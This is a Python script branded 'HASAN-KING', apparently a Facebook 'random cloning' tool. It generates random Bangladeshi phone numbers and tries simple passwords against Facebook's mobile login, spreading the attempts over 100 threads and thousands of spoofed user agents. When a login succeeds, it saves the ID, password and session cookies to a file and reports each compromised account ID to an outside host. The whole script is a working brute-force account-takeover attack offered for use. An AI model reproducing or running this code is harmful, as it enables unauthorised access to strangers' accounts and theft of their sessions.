import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
    
    attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'TASNIM' and password == 'LOVE':
        print(' \033[0;95mYou Have Successfully Logged in.')
        os.system('espeak  " Successfully,   Log,  In,  Sir"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass


os.system("espeak \"well come,to the HASAN-KING Random Cloning Start Please Wait\"")
logo=("""          
'\x1b[38;5;46m' ░░░░░██╗██╗██████╗░░█████╗░███╗░░██╗
'\x1b[38;5;47m' ░░░░░██║██║██╔══██╗██╔══██╗████╗░██║
'\x1b[38;5;48m' ░░░░░██║██║██████╦╝██║░░██║██╔██╗██║
'\x1b[38;5;49m' ██╗░░██║██║██╔══██╗██║░░██║██║╚████║
'\x1b[38;5;50m' ╚█████╔╝██║██████╦╝╚█████╔╝██║░╚███║
'\x1b[38;5;10m' ░╚════╝░╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝

\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m®\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92m HASAN-KING 
[\033[1;92m\033[1;34m®\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m UPDATE.DARK.CYBER.BD71
[\033[1;92m\033[1;34m®\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92m Rendom 
[\033[1;92m\033[1;34m®\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92m Teting 
[\033[1;92m\033[1;34m®\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m 0.1\033[1;35m]
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\x1b[1;91m             FUCK\x1b[1;93m YOU\x1b[1;96m HETTARS  
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""") 
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def HASAN():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;31mEXIT")
    print(f"\033[1;31m===================")
    print("")
    HASAN = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if HASAN in ["1"]:
        main()
    if HASAN in ["2"]:
        os.system('exit')
def main():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m BD SIM CODE ➤[016•017•018•019]')
    nude = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print ('\033[1;31m==================================================           ')
    limit = int(input('[•] YOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as HASAN :
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mSIM CODE : '+nude)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;33mTOTAL IDS : \033[1;92m'+tl)
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m[ON-OFF] AEROPLANE MODE ")
        print('\033[1;32m='*50)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'i miss you']
            HASAN.submit(rcrack,uid,pwx,tl)
    print ('\033[1;31m==================================================           ')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print ('\033[1;31m==================================================           ')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sHASAN-KING \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,ur-IN;q=0.6,ur;q=0.5,en-US;q=0.4',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A125F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
    'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                    print(f'  \r\033[1;92m  [ERROR-OK] '+uid+' • '+ps+'\33[0;92m')
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                    open('/sdcard/-HASAN-OK.txt','a').write(str(uid)+' | '+pas+' | '+coki+'\n')
                    oks.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
        
HASAN()